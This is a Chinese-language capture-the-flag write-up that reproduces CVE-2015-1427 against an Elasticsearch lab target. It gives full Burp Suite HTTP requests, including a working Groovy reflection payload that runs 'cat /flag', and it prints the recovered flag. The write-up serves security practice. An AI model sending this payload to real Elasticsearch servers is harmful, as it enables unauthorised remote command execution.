## 漏洞简介：

Elasticsearch 1.3.8 之前的 Groovy 脚本引擎和 1.4.1 之前的 4.3.x
允许远程攻击者绕过沙盒保护机制，通过构建的脚本执行任意 shell 命令。

### 影响版本：

ElasticSearch<=v1.4.2

## 漏洞环境：

春秋云镜中的漏洞靶标，CVE编号为CVE-2015-1427

## 漏洞复现：

访问漏洞环境

![](https://image.3001.net/images/20230616/1686902931_648c1893d09198ac1807d.png!small)

看到elasticSearch的版本为1.4.1猜测可能存在rce漏洞

  

打开burpsuite ，开启代理抓取数据包并把数据包并把数据包放到重放器中

![](https://image.3001.net/images/20230616/1686902958_648c18aec532092633364.png!small)

由于查询时至少要求ElasticSearch中有一条数据，所以替换如下数据：

> POST /website/blog/ HTTP/1.1
>
> Host: eci-2ze6p6jlhlj2syghya9p.cloudeci1.ichunqiu.com:9200
>
> Accept:
> text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-> exchange;v=b3;q=0.7
>
> Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
>
> User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
> (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.43
>
> Connection: close
>
> Content-Type: application/x-www-form-urlencoded
>
> Content-Length: 26
>
>  
>
>
> {
>
>  
>
>
> "name": "test"
>
>  
>
>
> }

![](https://image.3001.net/images/20230616/1686903401_648c1a690fee7b915b981.png!small)

利用反射机制执行JAVA代码：

> POST /_search?pretty HTTP/1.1
>
> Host: eci-2ze6p6jlhlj2syghya9p.cloudeci1.ichunqiu.com:9200
>
> Accept:
> text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-> exchange;v=b3;q=0.7
>
> Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
>
> User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
> (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.43
>
> Connection: close
>
> Content-Type: application/text
>
> Content-Length: 500
>
>  
>
>
>  
>
>
>  
>
>
> {
>
>  
>
>
> "size":1,
>
>  
>
>
> "script_fields": {
>
>  
>
>
> "test#": {
>
>  
>
>
> "script":
>
>  
>
>
>
> "java.lang.Math.class.forName(\"java.io.BufferedReader\").getConstructor(java.io.Reader.class).newInstance(java.lang.Math.class.forName(\"java.io.InputStreamReader\").getConstructor(java.io.InputStream.class).newInstance(java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"cat
> /flag\").getInputStream())).readLines()",
>
>  
>
>
>  
>
>
>  
>
>
> "lang": "groovy"
>
>  
>
>
> }
>
>  
>
>
> }
>
>  
>
>
>  
>
>
>  
>
>
> }

![](https://image.3001.net/images/20230616/1686903692_648c1b8c202c344e69fb3.png!small)

看到有加密过的文件猜测可能是base64编码，用burpsuite自带的解码工具尝试

![](https://image.3001.net/images/20230616/1686903729_648c1bb1c3020a9075add.png!small)

> flag{dfc6923c-0af6-42fe-b22e-9f04c6b07520}

  

